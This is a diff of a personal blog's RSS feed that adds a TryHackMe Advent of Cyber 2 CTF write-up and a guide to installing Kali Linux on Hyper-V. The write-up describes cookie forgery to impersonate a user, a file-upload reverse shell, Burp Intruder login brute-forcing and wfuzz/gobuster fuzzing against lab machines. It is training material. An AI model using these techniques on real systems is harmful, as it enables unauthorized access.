@@ -7,7 +7,97 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>© 2020 &lt;a href=&#39;https://github.com/markramige/markramigecom&#39;&gt;Mark Ramige&lt;/a&gt; :: &lt;a href=&#39;https://creativecommons.org/licenses/by/4.0/?ref=chooser-v1&#39;&gt;CC BY 4.0&lt;/a&gt; Licensed :: Powered by &lt;a href=&#39;http://gohugo.io&#39;&gt;Hugo&lt;/a&gt;</copyright>
-    <lastBuildDate>Sun, 04 Oct 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://markramige.com/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Fri, 25 Dec 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://markramige.com/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>TryHackMe Advent of Cyber 2 Write-Up</title>
+      <link>https://markramige.com/posts/tryhackme-advent-of-cyber-2-write-up/</link>
+      <pubDate>Fri, 25 Dec 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://markramige.com/posts/tryhackme-advent-of-cyber-2-write-up/</guid>
+      <description>Intro
+Contents  Day 1 - A Christmas Crisis Day 2 - The Elf Strikes Back! Day 3 - Christmas Chaos Day 4 - Santa&amp;rsquo;s Watching  Day 1 - A Christmas Crisis Task 6  What is the name of the cookie used for authentication?  Open Firefox devtools and go to the Network tab. There is only one cookie for this page.
+ In what format is the value of this cookie encoded?</description>
+      <content>&lt;p&gt;Intro&lt;/p&gt;
+&lt;h2 id=&#34;contents&#34;&gt;Contents&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#day-1---a-christmas-crisis&#34;&gt;Day 1 - A Christmas Crisis&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-2---the-elf-strikes-back&#34;&gt;Day 2 - The Elf Strikes Back!&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-3---christmas-chaos&#34;&gt;Day 3 - Christmas Chaos&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-4---santas-watching&#34;&gt;Day 4 - Santa&amp;rsquo;s Watching&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;day-1---a-christmas-crisis&#34;&gt;Day 1 - A Christmas Crisis&lt;/h2&gt;
+&lt;h3 id=&#34;task-6&#34;&gt;Task 6&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the name of the cookie used for authentication?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Open Firefox devtools and go to the Network tab. There is only one cookie for this page.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;In what format is the value of this cookie encoded?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;If you don&amp;rsquo;t immediately recognize the format, paste it into &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;CyberChef&lt;/a&gt; and try decoding from different formats until the output makes sense.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Having decoded the cookie, what format is the data stored in?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This will be obvious once the cookie is decoded.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the value of Santa&amp;rsquo;s cookie?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Replace the username of the cookie from your account and reencode it in the same format using CyberChef.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the flag you&amp;rsquo;re given when the line is fully active?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Replace your cookie with Santa&amp;rsquo;s cookie and reload the page. You should now be able to toggle all of the switches on and the flag will be shown.&lt;/p&gt;
+&lt;h2 id=&#34;day-2---the-elf-strikes-back&#34;&gt;Day 2 - The Elf Strikes Back!&lt;/h2&gt;
+&lt;h3 id=&#34;task-7&#34;&gt;Task 7&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;What string of text needs adding to the URL to get access to the upload page?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Based on the question we know that we need a GET request to gain access to the page. The name of the request is given on the webpage and the value of the request is given on the sticky note in the task text. The format of the request is &lt;code&gt;?name=value&lt;/code&gt;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What type of file is accepted by the site?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can check in the page source to see what kind of files are accepted in the &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt; tag. We can also just click on the file select button and the browser UI will show us what types of files are accepted. This doesn&amp;rsquo;t necessarily mean that the server accepts the same types of files, or that there are any checks on the server-side at all.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;In which directory are the uploaded files stored?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Once we&amp;rsquo;ve uploaded a file successfully, we can enumerate directories and see if we can guess the correct one. If it turns out not to be easy to guess, then we could use a directory brute-forcing tool such as &lt;code&gt;ffuf&lt;/code&gt;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Activate your reverse shell and catch it in a netcat listener!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Assuming we&amp;rsquo;ve configured the &lt;code&gt;php-remote-shell.php&lt;/code&gt; file correctly and run our listening, then it&amp;rsquo;s just a matter of navigating to the remote shell script in the browser and it will automatically connect to our listener.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the flag in /var/www/flag.txt?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Since our remote shell is now connected, we can just do &lt;code&gt;cat /var/www/flag.txt&lt;/code&gt; to get the flag!&lt;/p&gt;
+&lt;h2 id=&#34;day-3---christmas-chaos&#34;&gt;Day 3 - Christmas Chaos&lt;/h2&gt;
+&lt;h3 id=&#34;task-8&#34;&gt;Task 8&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the flag?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This task is a good demonstration of the power of Burp Suite intruder. We are going to intercept the traffic with Burp Suite while using our browser to log in. After finding the login request in Burp Suite, we send it to intruder and input the user names and passwords for the payloads. After the attack finishes, we can check the responses to see which of them redirects us to the &lt;code&gt;/tracker&lt;/code&gt; URL. We can now log in on the web page to get access to the Santa tracker. The flag is shown on the page.&lt;/p&gt;
+&lt;h2 id=&#34;day-4---santas-watching&#34;&gt;Day 4 - Santa&amp;rsquo;s Watching&lt;/h2&gt;
+&lt;h3 id=&#34;task-9&#34;&gt;Task 9&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Given the URL &amp;ldquo;&lt;a href=&#34;http://shibes.xyz/api.php%22,&#34;&gt;http://shibes.xyz/api.php&amp;quot;,&lt;/a&gt; what would the entire wfuzz command look like to query the &amp;ldquo;breed&amp;rdquo; parameter using the wordlist &amp;ldquo;big.txt&amp;rdquo; (assume that &amp;ldquo;big.txt&amp;rdquo; is in your current directory)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;An example command &lt;code&gt;wfuzz -c -z file,mywordlist.txt -d “username=FUZZ&amp;amp;password=FUZZ” -u http://shibes.thm/login.php&lt;/code&gt; is given in the task text. We are going to keep the &lt;code&gt;-c&lt;/code&gt; for color output and &lt;code&gt;-z&lt;/code&gt; for specifying the wordlist.&lt;/p&gt;
+&lt;p&gt;The URL will be replaced with the given URL in the question. The wordlist will be replaced with &lt;code&gt;big.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We also need to add ?breed=FUZZ to the end of the URL so that &lt;code&gt;wfuzz&lt;/code&gt; can work.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Use GoBuster to find the API directory. What file is there?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Running &lt;code&gt;gobuster dir -u MACHINE_IP -w /usr/share/wordlists/dirb/big.txt -x php,txt,html&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;All we&amp;rsquo;re doing here is running the same &lt;code&gt;gobuster&lt;/code&gt; command as in the task text, but replacing the URL with our target IP and the wordlist with the &lt;code&gt;big.txt&lt;/code&gt; wordlist from &lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34;&gt;Seclists&lt;/a&gt; which is included with Kali.&lt;/p&gt;
+&lt;p&gt;We find that /api is found by gobuster. If we navigate to &lt;code&gt;http://MACHINE_IP/api&lt;/code&gt; then we&amp;rsquo;ll find the file that is asked about in the question.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Now we&amp;rsquo;re going to change the wfuzz command that we used previously to find the flag. We&amp;rsquo;re also going to use the included &lt;code&gt;wordlist&lt;/code&gt; file to speed up the fuzzing.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;wfuzz -c -z file,wordlist http://MACHINE_IP/api/site-log.php?date=FUZZ&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We see from the output that one of the fuzzed dates returns 13 characters. If we enter &lt;code&gt;http://MACHINE_IP/api/site-log.php?date=DATEFOUNDBYWFUZZ&lt;/code&gt; in our browser we get our flag.&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>Installing and Optimizing Kali Linux on Hyper-V</title>
       <link>https://markramige.com/posts/installing-kali-linux-on-hyperv/</link>
@@ -15,6 +105,145 @@
       
       <guid>https://markramige.com/posts/installing-kali-linux-on-hyperv/</guid>
       <description>Kali Linux runs great on Windows if you’re using VirtualBox or VMware Workstation. You might have tried installing it on Hyper-V so that you can run WSL 2 distributions at the same time and experienced how poorly Hyper-V handles desktop Linux. Microsoft is working to fix this by enabling enhanced session mode on desktop linux distributions. I’ll show you how to set up Kali Linux on Hyper-V so that it runs faster and also to enable copying and pasting between the VM and host (including files).</description>
+      <content>&lt;p&gt;Kali Linux runs great on Windows if you’re using VirtualBox or VMware Workstation. You might have tried installing it on Hyper-V so that you can run WSL 2 distributions at the same time and experienced how poorly Hyper-V handles desktop Linux. &lt;a href=&#34;https://github.com/microsoft/linux-vm-tools&#34;&gt;Microsoft is working to fix this&lt;/a&gt; by enabling enhanced session mode on desktop linux distributions. I’ll show you how to set up Kali Linux on Hyper-V so that it runs faster and also to enable copying and pasting between the VM and host (including files).&lt;/p&gt;
+&lt;h2 id=&#34;contents&#34;&gt;Contents&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#hyper-v-network-setup&#34;&gt;Hyper-V network setup&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#create-a-new-virtual-machine&#34;&gt;Create a new virtual machine&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#create-a-virtual-hard-disk-and-enable-enhanced-session&#34;&gt;Create a virtual hard disk and enable enhanced session&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#open-and-adjust-vm-settings&#34;&gt;Open and adjust VM settings&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#create-partition-table-and-format-partitions&#34;&gt;Create partition table and format partitions&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#install-kali-linux&#34;&gt;Install Kali Linux&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#install-linux-vm-tools&#34;&gt;Install linux-vm-tools&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#adjust-xfce-settings&#34;&gt;Adjust XFCE settings&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#future-improvements&#34;&gt;Future improvements&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#conclusion&#34;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;*Open a PowerShell prompt with administrator privileges*&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;hyper-v-network-setup&#34;&gt;Hyper-V network setup&lt;/h2&gt;
+&lt;p&gt;We need to create a new network adapter called “External” that is bridged to your wifi or ethernet network adapter.&lt;/p&gt;
+&lt;p&gt;Run &lt;code&gt;Get-NetAdapter&lt;/code&gt; to get a list of your network adapters. Note the name of the one that connects to the Internet.&lt;/p&gt;
+&lt;p&gt;Run &lt;code&gt;New-VMSwitch -Name &amp;quot;External&amp;quot; -AllowManagementOS $True -NetAdapterName &amp;quot;YOURADAPTERNAME&amp;quot;&lt;/code&gt; and edit the name of your network adapter.&lt;/p&gt;
+&lt;p&gt;You will be disconnected from the network when the adapter is added. If your connection isn’t working after a few seconds, then the settings from your real adapter didn’t copy over correctly to the new “External” adapter. Go and edit them manually to the correct values. My DNS server settings didn’t copy over and I had to add them manually.&lt;/p&gt;
+&lt;h2 id=&#34;create-a-new-virtual-machine&#34;&gt;Create a new virtual machine&lt;/h2&gt;
+&lt;p&gt;Open up the Hyper-V Manager by running &lt;code&gt;C:\Windows\System32\virtmgmt.msc&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/hyper-v-manager.png&#34; alt=&#34;Hyper-V Manager&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Click on “New” and then “Virtual Machine”&lt;/p&gt;
+&lt;p&gt;Choose a name for the new VM.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/new-vm-name.png&#34; alt=&#34;Create VM name&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Select “Generation 2”&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/new-vm-generation-2.png&#34; alt=&#34;Create VM select generation 2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Choose how much memory you want to give the machine on startup. Since we’re also selecting “Dynamic Memory” it can go higher depending on what you set as the maximum later.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/new-vm-assign-memory.png&#34; alt=&#34;Create VM assign memory&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Choose the External adapter that we created earlier.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/new-vm-network-connection.png&#34; alt=&#34;Create VM select external connection&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We’re going to create a virtual hard disk manually and attach it later.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/new-vm-attach-vhd-later.png&#34; alt=&#34;Create VM attach VHD later&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;create-a-virtual-hard-disk-and-enable-enhanced-session&#34;&gt;Create a virtual hard disk and enable enhanced session&lt;/h2&gt;
+&lt;p&gt;Since we’re creating a dynamic vhdx file, we want to lower the block size so that it &lt;a href=&#34;https://docs.microsoft.com/en-us/windows-server/virtualization/hyper-v/best-practices-for-running-linux-on-hyper-v&#34;&gt;will use up less real space&lt;/a&gt;. The path and file name can be anything you want. You can set the SizeBytes (maximum size of the disk) value to anything over 32GB.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;New-VHD -Path C:\VHDs\Kali.vhdx -SizeBytes 128GB -Dynamic -BlockSizeBytes 1MB&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Run &lt;code&gt;Set-VM -VMName Kali -EnhancedSessionTransportType HvSocket&lt;/code&gt; to enable enhanced session mode.&lt;/p&gt;
+&lt;h2 id=&#34;open-and-adjust-vm-settings&#34;&gt;Open and adjust VM settings&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/vm-open-settings.png&#34; alt=&#34;VM open settings&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Disable secure boot&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/vm-settings-turn-off-secure-boot.png&#34; alt=&#34;VM settings turn off secure boot&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Set the maximum RAM that you can assign to this VM.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/vm-settings-memory-size.png&#34; alt=&#34;VM settings memory size&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Set the number of processors you want to give the VM.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/vm-settings-processors.png&#34; alt=&#34;VM settings processors&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I always turn off automatic checkpoints because I like to do them manually.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/vm-settings-checkpoints.png&#34; alt=&#34;VM settings checkpoints&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I don’t want this machine starting at boot.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/vm-settings-no-automatic-start.png&#34; alt=&#34;VM settings startup&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Browse to the vhdx file you created earlier.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/vm-settings-select-vhd.png&#34; alt=&#34;VM settings select VHD&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Add a DVD drive for installation.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/vm-settings-add-dvd-drive.png&#34; alt=&#34;VM settings add DVD drive&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Select the Kali live iso you downloaded earlier.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/vm-settings-select-kali-live-iso.png&#34; alt=&#34;VM settings select Kali live iso&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Set the boot order so that it will boot from the iso automatically.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/vm-settings-set-boot-order.png&#34; alt=&#34;VM Settings set boot order&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;create-partition-table-and-format-partitions&#34;&gt;Create partition table and format partitions&lt;/h2&gt;
+&lt;p&gt;Boot the default option in the menu&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-live-boot-menu.png&#34; alt=&#34;Kali live boot menu&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Open a terminal and run &lt;code&gt;sudo gdisk /dev/sda&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Type &lt;code&gt;o&lt;/code&gt; to create a new partition table&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-live-gdisk-new.png&#34; alt=&#34;Kali live gdisk create partition table&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Type &lt;code&gt;n&lt;/code&gt; and for the last sector type &lt;code&gt;+128M&lt;/code&gt;, then for the partition type enter &lt;code&gt;ef00&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-live-gdisk-new-efi.png&#34; alt=&#34;Kali live gdisk new efi partition&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Type &lt;code&gt;n&lt;/code&gt; and choose all the default options to create a linux partition with the remainder of the space.&lt;/p&gt;
+&lt;p&gt;Type &lt;code&gt;p&lt;/code&gt; to print the partition table to verify everything is correct.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-live-gdisk-new-linux.png&#34; alt=&#34;Kali live gdisk new linux partition&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Type &lt;code&gt;w&lt;/code&gt; to save the partition table and exit gdisk.&lt;/p&gt;
+&lt;p&gt;Run &lt;code&gt;mkdosfs -F 32 -n EFI /dev/sda1&lt;/code&gt; to format the EFI partition.&lt;/p&gt;
+&lt;p&gt;Run &lt;code&gt;mkfs.ext4 -G 4096 /dev/sda2&lt;/code&gt; to format the Kali partition. &lt;a href=&#34;https://docs.microsoft.com/en-us/windows-server/virtualization/hyper-v/best-practices-for-running-linux-on-hyper-v&#34;&gt;Microsoft recommends&lt;/a&gt; setting the number of groups to 4096.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-live-gdisk-save-and-mkfs-ext4.png&#34; alt=&#34;Kali live gdisk save partitions and format&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;install-kali-linux&#34;&gt;Install Kali Linux&lt;/h2&gt;
+&lt;p&gt;Open the VM settings and change the image file to the Kali netinstall iso that you downloaded earlier.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/vm-settings-select-kali-netinst.png&#34; alt=&#34;VM settings select kali netinstall iso&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Run the VM and choose the default boot option.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-boot-menu.png&#34; alt=&#34;Kali netinstall boot menu&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Set your language, location, and keyboard.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-language.png&#34; alt=&#34;Kali netinstall select language&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-location.png&#34; alt=&#34;Kali netinstall select location&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-keyboard.png&#34; alt=&#34;Kali netinstall select keyboard&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Choose your hostname and domain name (I left domain blank).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-host-name.png&#34; alt=&#34;Kali netinstall set host name&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-domain-name.png&#34; alt=&#34;Kali netinstall set domain name&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Enter your name, user name, and password.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-user-full-name.png&#34; alt=&#34;Kali netinstall set full user name&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-user-name.png&#34; alt=&#34;Kali netinstall set user name&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-password.png&#34; alt=&#34;Kali netinstall set password&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Set your time zone.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-time-zone.png&#34; alt=&#34;Kali netinstall set timezone&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Choose manual partitioning because we already created the partition table and formatted.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-manual-partition.png&#34; alt=&#34;Kali netinstall manual partition&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The EFI partition is already set up so we want to edit the second partition for Kali.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-partition-select.png&#34; alt=&#34;Kali netinstall select partition to change&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Set it to ext4 partition, set the mount point as &lt;code&gt;/&lt;/code&gt; and keep the existing data.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-partition-options.png&#34; alt=&#34;Kali netinstall partition options&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Write changes to disk.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-partition-finish.png&#34; alt=&#34;Kali netinstall finish partitioning&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Continue without a swap partition.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-partition-swap.png&#34; alt=&#34;Kali netinstall continue without swap&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Continue with installation.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-partition-continue.png&#34; alt=&#34;Kali netinstall save partition settings and continue&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Set up a network proxy (I left this blank.)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-proxy.png&#34; alt=&#34;Kali netinstall enter proxy settings&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Choose the software you want installed (I went with the default options)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-software-selection.png&#34; alt=&#34;Kali netinstall select software to install&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I had an error message after all of the packages downloaded. I hit continue a few times and it continued installing where it left off without giving another error.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-error.png&#34; alt=&#34;Kali netinstall software installation error&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-continue-after-error.png&#34; alt=&#34;Kali netinstall continue after error message&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Kali is installed! Shut down the machine and remove the DVD drive in the settings.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-netinstall-finished.png&#34; alt=&#34;Kali netinstall finished&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/vm-settings-remove-dvd-drive.png&#34; alt=&#34;VM settings remove DVD drive&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;install-linux-vm-tools&#34;&gt;Install linux-vm-tools&lt;/h2&gt;
+&lt;p&gt;Start up the Kali VM and log in.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-boot-menu.png&#34; alt=&#34;Kali Linux boot menu&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-login-screen.png&#34; alt=&#34;Kali Linux login screen&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Open a terminal and run &lt;code&gt;git clone https://github.com/markramige/linux-vm-tools&lt;/code&gt; to download the install script&lt;/p&gt;
+&lt;p&gt;Now run &lt;code&gt;sudo linux-vm-tools/kali/install.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This script will update Kali, install xrdp, and change some settings that are necessary for the enhanced session mode to activate. Reboot the machine when it finishes.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/kali-linux-vm-tools-install.png&#34; alt=&#34;Kali Linux tools install&#34;&gt;&lt;/p&gt;
+&lt;p&gt;You can now set the resolution of the RDP session. This screen will pop up every time you boot unless you save the settings. If this screen doesn’t pop up the first time you reboot, try shutting down the machine completely and starting it again. Alternatively you can save the machine state at the kali login screen and the next time you start it up it will switch to the enhanced session.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/hyperv-enhance-resolution.png&#34; alt=&#34;Hyper-V enhanced session menu&#34;&gt;&lt;/p&gt;
+&lt;p&gt;You should see the xrdp login screen instead of the default Kali login screen.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/xrdp-login-screen.png&#34; alt=&#34;Xrdp login screen&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;adjust-xfce-settings&#34;&gt;Adjust XFCE settings&lt;/h2&gt;
+&lt;p&gt;I’ve found that disabling desktop compositing makes it feel much faster.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/xfce-disable-compositing.png&#34; alt=&#34;XFCE disable compositing&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Disable desktop blanking and locking&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://markramige.com/images/installing-kali-linux-on-hyperv/xfce-disable-display-blanking.png&#34; alt=&#34;XFCE disable display blanking&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Set the desktop background to a solid color&lt;/p&gt;
